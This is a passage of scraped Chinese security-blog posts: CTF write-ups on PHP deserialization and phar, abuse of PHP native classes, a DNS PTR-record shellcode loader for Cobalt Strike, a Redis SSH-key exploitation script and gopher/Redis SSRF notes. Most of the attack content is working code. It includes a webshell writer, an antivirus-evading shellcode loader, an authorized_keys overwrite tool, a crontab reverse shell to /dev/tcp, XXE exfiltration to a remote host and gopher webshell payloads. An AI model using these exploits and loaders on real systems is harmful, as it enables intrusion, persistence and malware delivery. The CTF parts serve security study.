$content;}class login{ public $file; public $filename; public $content;}class register{}class Open{}$a=new Game();$b=new Open();$a-&gt;register='admin';$a-&gt;file=$b;$a-&gt;filename='shell';$a-&gt;username='admin';$a-&gt;password='admin';echo base64_encode(serialize($a));//$b=new login(); 12345678910111213//shell.php&lt;?phpfunction shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(&quot;NO&quot;); }else{ return system($cmd); } }else{ die('so long!'); }}login success you can to open shell file! 可以看到必须删除掉waf.txt才能调用shell方法 123456789class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); } }} 在这个地方花费了很长时间，一开始的思路是利用伪协议来操作文件，但是伪协议不能做到删除文件。后来想到可以利用同名方法，查php内置类的时候发现ZipArchive类有open方法 1234567public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); } } 构造删除文件exp 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{ public $file; public $filename; public $content;}class register{}class Open{}$a=new Game();$b=new ZipArchive();$a-&gt;content=ZipArchive::OVERWRITE;$a-&gt;register='admin';$a-&gt;file=$b;$a-&gt;filename='waf.txt';$a-&gt;username='admin';$a-&gt;password='admin';echo base64_encode(serialize($a));//$b=new login(); 删除成功 接下来可以调用shell方法了，限制长度为10位字符，可以采用追加内容的方式写入shell 12345678910111213//shell.php&lt;?phpfunction shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(&quot;NO&quot;); }else{ return system($cmd); } }else{ die('so long!'); }}login success you can to open shell file! 为了防止出现&lt;?这种特殊字符，把内容先base64编码后再写入 12//&lt;?php eval($_GET[1]);echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php 把文件内容分割后写入到文件名中，因为写入时间顺序的原因所以需要把命令倒序写入，ls -t表示把文件名按照时间排序，把所有文件名写入到0这个文件中，然后sh 0执行echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php写入文件 1234567891011121314151617181920w&gt;hpw&gt;1.p\\\\w&gt;d\\&gt;\\\\w&gt;\\ -\\\\w&gt;e64\\\\w&gt;bas\\\\w&gt;7\\|\\\\w&gt;XSk\\\\w&gt;Fsx\\\\w&gt;dFV\\\\w&gt;kX0\\\\w&gt;bCg\\\\w&gt;XZh\\\\w&gt;AgZ\\\\w&gt;waH\\\\w&gt;PD9\\\\w&gt;o\\ \\\\w&gt;ech\\\\ls -t&gt;0sh 0 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{ public $file; public $filename; public $content;}class register{}class Open{}$a=new Game();$b=new Open();$a-&gt;register='admin';$a-&gt;content='w&gt;e64\\\\';$a-&gt;file=$b;$a-&gt;filename='shell';$a-&gt;username='admin';$a-&gt;password='admin';echo base64_encode(serialize($a));//$b=new login(); 命令有点长，写了个脚本利用，首先新建二十个php文件，修改content属性为对应的命令，然后生成payload再发起请求 1234567891011import requestsfor i in range(1,21): localurl='http://localhost/ctf/1/%d.php' %i r=requests.get(localurl) payload=r.text #print(payload) data={'unser':payload} r=requests.post(url='http://cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun/?a[]=1&amp;b[]=2',data=data) print(r.status_code) 拿到flag 1http://cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun/1.php?1=system(%22cat%20/flag%22);","link":"/2021/03/23/nepctf%E9%83%A8%E5%88%86wp/"},{"title":"phar反序列化学习","text":"phar文件结构分析 大体来说 Phar 结构由4部分组成 1.stub ：phar文件标识 12345&lt;?phpPhar::mapPhar();include 'phar://phar.phar/index.php';__HALT_COMPILER();?&gt; 可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 这函数识别利用。 2. a manifest describing the contents phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 3. the file contents 被压缩文件的内容。 4. [optional] a signature for verifying Phar integrity (phar file format only) 签名，放在文件末尾，格式如下 利用把一个序列化的对象，储存在phar格式的文件中，生成后的文件可以以任意格式保存，通过文件包含函数（下图），用phar://协议包含文件，就可以把对象反序列化。php中大部分文件函数在通过phar://解析phar文件时，会将meta-data进行反序列化，受影响的函数如下： 利用原理 12345678910&lt;?phpclass test{ public function __destruct() { echo 'destructed'; }}$filename='phar://phar.phar/test.txt';file_get_contents($filename);?&gt; 例题[GXYCTF2019]BabysqliV3.0利用思路：$this-&gt;Filename可控，从GET参数name中获取。Uploader类中的__toString()方法返回$this-&gt;Filename，最后的flie_get_contents参数实际可直接从name参数获取，这样就可以用phar://触发反序列化。此外还需要满足条件$this-&gt;token 等于$_SESSION['user']，$_SESSION['user']可从文件名中获得。最后构造phar://包含文件。 开始用弱口令admin password登陆 弱口令登陆进去，发现可以上传文件，但是没有给出返回路径，观察到file参数可能可以利用 只要参数中不以home和upload结尾就会自动把后缀名改成cc.fxxkyou! 利用php://filter读取文件源码 1http://bf4bee72-3946-49dc-b598-48b3dc0ac6aa.node3.buuoj.cn/home.php?file=php://filter/read=convert.base64-encode/resource=upload 123456789101112131415161718192021222324252627//home.php&lt;?phpsession_start();echo &quot;&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=utf-8\\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_SESSION['user'])){ if(isset($_GET['file'])){ if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET['file'])){ die(&quot;hacker!&quot;); } else{ if(preg_match(&quot;/home$/i&quot;, $_GET['file']) or preg_match(&quot;/upload$/i&quot;, $_GET['file'])){ $file = $_GET['file'].&quot;.php&quot;; } else{ $file = $_GET['file'].&quot;.fxxkyou!&quot;; } echo &quot;å½åå¼ç¨çæ¯ &quot;.$file; require $file; } } else{ die(&quot;no permission!&quot;); }}?&gt; 利用思路：$this-&gt;Filename可控，从GET参数name中获取。Uploader类中的__toString()方法返回$this-&gt;Filename，最后的flie_get_contents参数实际可直接从name参数获取，这样就可以用phar://触发反序列化。此外还需要满足条件$this-&gt;token 等于$_SESSION['user']，$_SESSION['user']可从文件名中获得。最后构造phar://包含文件。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374//upload.php&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; ä¸ä¼ æä»¶ &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸ä¼ &quot; /&gt;&lt;/form&gt;&lt;?phperror_reporting(0);class Uploader{ public $Filename; public $cmd; public $token; function __construct(){ $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION['user']).&quot;/&quot;; $ext = &quot;.txt&quot;; @mkdir($sandbox, 0777, true); if(isset($_GET['name']) and !preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET['name'])){ $this-&gt;Filename = $_GET['name']; } else{ $this-&gt;Filename = $sandbox.$_SESSION['user'].$ext; } $this-&gt;cmd = &quot;echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';&quot;; $this-&gt;token = $_SESSION['user']; } function upload($file){ global $sandbox; global $ext; if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){ $this-&gt;cmd = &quot;die('illegal filename!');&quot;; } else{ if($file['size'] &gt; 1024){ $this-&gt;cmd = &quot;die('you are too big (â²â½`ã)');&quot;; } else{ $this-&gt;cmd = &quot;move_uploaded_file('&quot;.$file['tmp_name'].&quot;', '&quot; . $this-&gt;Filename . &quot;');&quot;; } } } function __toString(){ global $sandbox; global $ext; // return $sandbox.$this-&gt;Filename.$ext; return $this-&gt;Filename; } function __destruct(){ if($this-&gt;token != $_SESSION['user']){ $this-&gt;cmd = &quot;die('check token falied!');&quot;; } eval($this-&gt;cmd); }}if(isset($_FILES['file'])) { $uploader = new Uploader(); $uploader-&gt;upload($_FILES[&quot;file&quot;]); if(@file_get_contents($uploader)){ echo &quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;; echo file_get_contents($uploader); }}?&gt; 上传txt文件，得到$_SESSION[‘user’] 构造exp，生成phar文件并上传 12345678910111213141516171819202122&lt;?phpclass Uploader{ public $Filename; public $cmd='show_source(&quot;flag.php&quot;);'; public $token='GXY57eb0a54186eb32ad70deb2e3da0b903';}$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$a=new Uploader();$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 读取flag 1http://dc0a112a-07ab-4130-a0cc-497b03dde141.node3.buuoj.cn/home.php?file=upload&amp;name=phar:///var/www/html/uploads/ef30d6288c320cd6e01dc95841a44ad0/GXY57eb0a54186eb32ad70deb2e3da0b903.txt","link":"/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"},{"title":"php原生类利用","text":"适用场景在存在任意类实例化漏洞但是没有pop链的情况下，可以尝试利用原生类 GlobIterator可以列出目录下的文件名 适用版本：php5.3.* php 7 第一个参数指定搜索的路径和类型，第二个参数为选择文件的哪个信息作为键名 1$newclass = new GlobIterator('./*.php',0); 12345678&lt;?php$iterator = new GlobIterator(__DIR__ . './*.php');while ($iterator-&gt;valid()) { echo $iterator-&gt;current()-&gt;getFilename() . '&lt;/br&gt;'; $iterator-&gt;next();}?&gt; SimpleXMLElementSimpleXMLElement::__contruct Libxml2.9后默认不允许解析外部实体，可以通过函数参数LIBXML_NOENT开启解析 利用 根据可控方式选择 本地读取123456789101112131415161718192021&lt;?phpclass NotFound{ function __construct() { die('404'); }}spl_autoload_register( function ($class){ new NotFound(); });$classname = isset($_GET['name']) ? $_GET['name'] : null;$param = isset($_GET['param']) ? $_GET['param'] : null;$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;if(class_exists($classname)){ $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.'=&gt;'.$value.'&lt;br&gt;';} 123456789101112&lt;?php$a='&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;';$a=new SimpleXMLElement($a,2);echo $a;?&gt; 需要两个参数可控 利用SimpleXMLElement构造一个XML文档，从而利用 XXE读取文件 。当文件中有&lt; &gt; &amp; ‘ “ 这5个符号时，会导致XML文件解析错误，所以要利用php://filter，将要读取的文件内容经过 base64编码 后输出。如： 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY name SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot; &gt;]&gt;&lt;a&gt;&amp;name;&lt;/a&gt; 有几个地方需要注意以下，在url中不能直接打&amp; 会被歧义，我们使用 %26 还有就是resource=后面不需要引号包裹。第二个参数里的2对应的模式是 LIBXML_NOENT。payload: 1?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY name SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot; &gt;]&gt;&lt;a&gt;%26name;&lt;/a&gt;&amp;param2=2 至于为什么第二个参数为二，实际上这里2对应的模式是 LIBXML_NOENT ，我们直接记住用二吧不然就是直接百度。 远程读取必须有三个参数可控，才能读取远程xml文件。 123456789101112131415161718192021222324// index.php&lt;?phpclass NotFound{ function __construct() { die('404'); }}spl_autoload_register( function ($class){ new NotFound(); });$classname = isset($_GET['name']) ? $_GET['name'] : null;$param = isset($_GET['param']) ? $_GET['param'] : null;$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;$param3 = isset($_GET['param3']) ? $_GET['param3'] : null;if(class_exists($classname)){ //$newclass = new $classname($param,$param2); $newclass = new $classname($param,$param2,$param3); var_dump($newclass);// foreach ($newclass as $key=&gt;$value)// echo $key.'=&gt;'.$value.'&lt;br&gt;';} SimpleXMLElement读取远程文件evil.xml-&gt;evil.xml请求send.xml，实际执行的是send.xml send.php负责保存结果，在vps上构造如下evil.xml、send.xml和send.php这三个文件。 evil.xml： 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &quot;http://47.xxx.xxx.72/send.xml&quot;&gt;%remote;%all;%send;]&gt; send.xml： 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.111.129/send.php?file=%file;'&gt;&quot;&gt; send.php： 123&lt;?php file_put_contents(&quot;result.txt&quot;, $_GET['file']) ;?&gt; 然后在url中构造如下： 1/show.php?module=SimpleXMLElement&amp;args[]=http://47.xxx.xxx.72/evil.xml&amp;args[]=2&amp;args[]=true 接收到数据 Error/Exception__toString Error1234&lt;?php$a=new Error('&lt;script&gt;alert(1)&lt;/script&gt;');echo $a;?&gt; getmessagegetMessage可直接传入eval执行命令，将转换成hex执行 1234$a = new Error('?');$c = &quot;getMessage&quot;;$d = &quot;eval(phpinfo())&quot;;eval(&quot;\\$a-&gt;$c($d);&quot;); 1eval(hex2bin(&quot;6563686f20706928293b&quot;)) 1234567&lt;?phpecho bin2hex('phpinfo();');$a=new Error();$a-&gt;getMessage(eval(hex2bin(&quot;706870696e666f28293b&quot;)));////echo bin2hex('phpinfo()');?&gt; SoapClientphp存在内置类SoapClient::__call，存在可以触发__call方法时，可以进行ssrf 进行SSRF 配合CRLF 1234567891011121314151617&lt;?php$target = 'http://192.168.111.129:5555/path';$post_string = 'data=something';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=my_session');$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$aaa = str_replace('&amp;','&amp;',$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt; 成功接收到报文 DirectoryIterator遍历目录 1234567891011121314151617181920212223242526272829303132DirectoryIterator extends SplFileInfo implements SeekableIterator { /* 方法 */ public __construct ( string $path ) public current ( ) : DirectoryIterator public getATime ( ) : int public getBasename ( string $suffix = ? ) : string public getCTime ( ) : int public getExtension ( ) : string public getFilename ( ) : string public getGroup ( ) : int public getInode ( ) : int public getMTime ( ) : int public getOwner ( ) : int public getPath ( ) : string public getPathname ( ) : string public getPerms ( ) : int public getSize ( ) : int public getType ( ) : string public isDir ( ) : bool public isDot ( ) : bool public isExecutable ( ) : bool public isFile ( ) : bool public isLink ( ) : bool public isReadable ( ) : bool public isWritable ( ) : bool public key ( ) : string public next ( ) : void public rewind ( ) : void public seek ( int $position ) : void public __toString ( ) : string // 以字符串形式获取文件名 public valid ( ) : bool} FilesystemIterator列出目录下文件 123&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir; SplFileInfo读取文件，但是不添加其他参数只能读取第一行 123&lt;?php$context = new SplFileObject('/etc/passwd');echo $context; 可以通过遍历的方式读取所有内容 12345&lt;?php$context = new SplFileObject('/etc/passwd');foreach($context as $f){ echo($f);} ReflectionFunctioninvokeArgs 可执行命令 12345678910&lt;?php$a=new ReflectionFunction('call_user_func');$a-&gt;invokeArgs(array('system','whoami'));$a=new ReflectionFunction('system');$a-&gt;invokeArgs(array('whoami'));?&gt; 例子 123456789101112131415161718192021222324252627&lt;?phpfunction waf($s){ return preg_replace('/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\\/\\/|&gt;/i',&quot;NepnEpneP&quot;, $s);}if(isset($_GET['a'])){ $_ = waf($_GET['a']); $__ = waf($_GET['b']); $a = new $_($__);}else{ $a = new Error('?');}if(isset($_GET['c']) &amp;&amp; isset($_GET['d'])){ $c = waf($_GET['c']); $d = waf($_GET['d']); eval(&quot;\\$a-&gt;$c($d);&quot;);}else{ $c = &quot;getMessage&quot;; $d = &quot;&quot;; eval(&quot;echo \\$a-&gt;$c($d);&quot;);}//$a = new Error('?');//$c = &quot;getMessage&quot;;//$d = &quot;eval(phpinfo())&quot;;//eval(&quot;\\$a-&gt;$c($d);&quot;);?&gt;","link":"/2021/04/19/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"},{"title":"python利用dns的PTR记录加载shellcode","text":"DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。 PTR记录的两个特性 1.不区分大小写，dns解析结果统一转为小写 2.格式不定，可以出现包括“!@#$%^&amp;*()_+=/?&lt;&gt;”在内的各种特殊字符和空格，只有反斜杠“\\”会被过滤。 在本地服务器添加 进行反向解析查询，192.168.111.135为DNS服务器的ip 1nslookup -qt=ptr 192.168.111.1 192.168.111.135 可以看到成功获取了之前设置好的内容，可以把这一段代码替换成shellcode 用cs生成shellcode，由于shellcode本质是一串十六进制的机器码，因此可以先去掉前面的转义字符\\x并以字符串的形式保存在PTR记录中，执行时再转为十六进制格式，也符合PTR记录中不能出现反斜杠的规则 分割shellcode，每个ip对应的PTR记录保存一行，这里添加的IP为192.168.111.20-192.168.111.59 去掉所有的\\x，把它们分割成多个部分按照顺序添加到PTR记录中 只需要按照顺序对相应的ip发起请求即可获得部分shellcode 利用python的dnspython库获取PTR记录中的shellcode，然后分配内存执行 123456789101112131415161718192021222324252627282930313233343536import dns.resolverimport dns.reversenameimport ctypesdnsip='192.168.111.135'def LoadshellCode(shellcode): #执行shellcode ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode))) handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0))) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))def requestptr(dnsip,ipnum): #获取PTR记录 ipaddr='192.168.111.%d' %ipnum #添加的PTR记录中主机ip地址的C段地址 ip=dns.reversename.from_address(ipaddr) my_resolver = dns.resolver.Resolver() my_resolver.nameservers = [dnsip] answer = my_resolver.resolve(ip,'PTR') recvptr=str(answer[0]).strip('.') return recvptrdef str2hex(shellcodedemo): #将得到的shellcode转为十六进制 s='' s1=b'' for i in range(int(len(shellcodedemo))): if i % 2 == 0: s1 += bytes.fromhex(shellcodedemo[i:i + 2]) return bytearray(s1)if __name__=='__main__': s='' for i in range(20,60): #根据添加的ip范围进行请求，192.168.111.20-192.168.111.59对应range(20,60) s+=requestptr(dnsip,i) LoadshellCode(str2hex(s)) 使用pyinstaller打包成exe文件， 1pyinstaller -F -w dnsptrshellcode.py pyinstaller默认一并打包所有库，造成生成的exe文件体积过大，可以利用虚拟环境打包的方式压缩下体积，压缩后的体积大概为3M左右 https://blog.csdn.net/p1967914901/article/details/109706449 拿到beacon 可以绕过360，但被火绒查杀 github地址：https://github.com/sp4zcmd/DnsPTRShellcodeLoader 参考： https://www.freebuf.com/articles/network/185324.html","link":"/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/"},{"title":"python编写Redis漏洞检测和利用脚本","text":"python编写Redis漏洞检测和利用脚本环境配置1234# wget http://download.redis.io/releases/redis-6.0.8.tar.gz# tar xzf redis-6.0.8.tar.gz# cd redis-6.0.8# make 执行完 make 命令后，redis-6.0.8 的 src 目录下会出现编译后的 redis 服务程序 redis-server，还有用于测试的客户端程序 redis-cli： 下面启动 redis 服务： 12# cd src# ./redis-server 修改redis.conf，先注释掉bind 127.0.0.1这一行，允许远程登陆，同时关闭保护模式 使用修改后的配置文件启动 12# cd src# ./redis-server ../redis.conf 利用过程修改数据库默认路径为/root/.ssh，默认缓存文件为authorized.keys，把目标主机缓存的公钥作为value保存在authorized.keys文件中，这样就在服务器端/root/.ssh下生成了一个授权的key 1.本地主机生成密钥key 1ssh-keygen -t rsa 2.在目录/root/.ssh下查看生成结果，并把公钥导入txt文件中 1234cd /root/.sshls(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; key.txtcat key.txt 3.把生成的公钥导入Redis缓存中 1cat /root/key.txt | redis-cli -h xx.xx.xx.xx 4.连接到目标主机，更改配置文件路径为/root/.ssh，设置文件名称为authorized-keys 12345redis-cli -h xx.xx.xx.xxconfig set dir /root/.sshConfig set dbfilename authorized_keyssave 5.ssh连接到目标主机 1ssh xx.xx.xx.xx 编写python脚本github地址：https://github.com/sp4zcmd/SimpleRedisScanner 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import socketimport redisimport sysdef Usage(): print('RedisScanner.py 127.0.0.1 key.txt')def Scan(ip): payload=&quot;\\x2a\\x31\\x0d\\x0a\\x24\\x34\\x0d\\x0a\\x69\\x6e\\x66\\x6f\\x0d\\x0a&quot; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(10) try: s.connect((ip, 6379)) s.sendall(payload.encode()) recvdata=s.recv(1024).decode() if 'redis_version' in recvdata: print('[+] %s is vulnerable ' %ip) #print(recvdata) return True except: print('[-] %s is not vulnerable ' %ip) return False passdef WriteSSHKeygen(ip,sshkey): try: r = redis.StrictRedis(host=ip, port=6379, db=0, socket_timeout=2) r.flushall() r.set('crackit', sshkey) r.config_set('dir', '/root/.ssh/') r.config_set('dbfilename', 'authorized_keys') r.save() print('[+] Write SSHkeygen successful') except: print('[-] Write SSHkeygen Failed') passif __name__=='__main__': if(len(sys.argv)==3): ip=sys.argv[1] sshkeyfile=sys.argv[2] try: with open(sshkeyfile, 'r') as f: sshkey = f.read() except: print('Read SSHkeygen Failed') pass if Scan(ip): WriteSSHKeygen(ip, sshkey) else: Usage() 运行测试 写入成功 成功连接","link":"/2021/03/06/python%E7%BC%96%E5%86%99Redis%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/"},{"title":"ssrf中gopher+redis的利用总结","text":"crontab只能在Centos上使用，原因： 1.redis默认写入文件的权限为644，而ubuntu要求执行定时任务文件/var/spool/cron/crontabs/&lt;username&gt;权限必须是600，否则会报错。而Centos的定时任务文件/var/spool/cron/&lt;username&gt;权限644也可执行。 2.因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错 3.不同系统中crontrab定时文件位置也会不同Centos的定时任务文件在/var/spool/cron/&lt;username&gt;Ubuntu定时任务文件在/var/spool/cron/crontabs/&lt;username&gt;，Centos和Ubuntu均存在的（需要root权限）/etc/crontab ，高版本的redis默认启动是redis权限，所以无法利用。 payload 12345set xxx &quot;\\n\\n* * * * * bash -i&gt;&amp; /dev/tcp/10.133.164.81/6666 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave 写入公钥向/root/.ssh中写入公钥即可用ssh登陆服务器，高版本redis少有root权限，难以利用 生成私钥 1ssh-keygen -t rsa redis命令 123456flushallset 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali'config set dir /root/.ssh/config set dbfilename authorized_keyssave 写入webshell比较常用的方法，以[网鼎杯 2020 玄武组]SSRFMe为例 访问index.php，过滤127.0.0.1，使用http://0.0.0.0绕过，提示要访问hint.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpfunction check_inner_ip($url){ $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) { die('url fomat error'); } try { $url_parse=parse_url($url); } catch(Exception $e) { die('url fomat error'); return false; } $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16;}function safe_request_url($url){ if (check_inner_ip($url)) { echo $url.' is inner ip'; } else { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url']) { safe_request_url($result_info['redirect_url']); } curl_close($ch); var_dump($output); }}if(isset($_GET['url'])){ $url = $_GET['url']; if(!empty($url)){ safe_request_url($url); }}else{ highlight_file(__FILE__);}// Please visit hint.php locally.?&gt; 读取hint.php 1http://cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn/?url=http://0.0.0.0/hint.php hint.php 12345678&lt;?phpif($_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;){ highlight_file(__FILE__);}if(isset($_POST['file'])){ file_put_contents($_POST['file'],&quot;&lt;?php echo 'redispass is root';exit();&quot;.$_POST['file']);}&quot; 利用dict://访问6379端口，存在redis，前面给出了密码为root 1http://cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn/?url=dict://0.0.0.0:6379 利用gopher协议，生成payload 123C:\\Users\\dell\\Desktop&gt; python2 G:\\工具\\ssrf工具\\gopherwriteshell2.pygopher://0.0.0.0:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A python脚本 1234567891011121314151617181920212223242526272829303132import urllibprotocol=&quot;gopher://&quot;ip=&quot;10.0.231.11&quot; // 运行有redis的主机ipport=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)), &quot;config set dir {}&quot;.format(path), &quot;config set dbfilename {}&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in 